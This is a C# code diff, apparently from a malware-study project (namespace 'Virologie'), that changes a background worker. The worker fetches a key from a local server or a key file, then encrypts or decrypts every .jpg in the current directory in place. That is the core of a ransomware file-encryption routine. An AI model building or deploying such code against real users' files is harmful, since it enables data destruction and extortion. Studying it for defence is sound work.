@@ -15,6 +15,7 @@ namespace Virologie
 
     class EncryptWorker : BackgroundWorker
     {
+        private readonly string _keyfile;
         private readonly bool _decrypt;
         public EncryptError ErrorType { get; private set; }
 
@@ -41,9 +42,9 @@ namespace Virologie
             _switchFiles = !_switchFiles;
         }
 
-        public EncryptWorker(bool decrypt = false)
+        public EncryptWorker(String keyfile = null)
         {
-            _decrypt = decrypt;
+            _keyfile = keyfile;
             DoWork += worker_DoWork;
             WorkerReportsProgress = true;
         }
@@ -51,30 +52,29 @@ namespace Virologie
         void worker_DoWork(object sender, DoWorkEventArgs args)
         {
             var explorer = new FileExplorer();
-            FileEncrypter encrypter;
-            encrypter = _decrypt 
+            FileEncrypter encrypter = (_keyfile == null)
                 ? CryptoKeyManager.CreateFromServer("http://localhost:1234/") 
-                : CryptoKeyManager.CreateFromFile(CryptoKeyManager.guid.ToString());
+                : CryptoKeyManager.CreateFromFile(_keyfile);
 
             if (encrypter != null)
             {
                 var files = explorer.EnumerateFiles(Directory.GetCurrentDirectory(), "*.jpg");
                 int count = 1;
                 var enumerable = files as IList<string> ?? files.ToList();
+                CryptoKeyManager.SaveGUID();
                 foreach (var file in enumerable)
                 {
                     ReportProgress(100 * count++ / (100 * enumerable.Count()));
                     CurrentFile = file;
                     SwitchFiles();
 
-                    if (_decrypt)
-                        encrypter.Encrypt(file);
-                    else
+                    if (_keyfile != null)
                         encrypter.Decrypt(file);
+                    else
+                        encrypter.Encrypt(file);
 
                     explorer.ReplaceFile(file);
                 }
-                CryptoKeyManager.SaveGUID();
             }
         }
     }
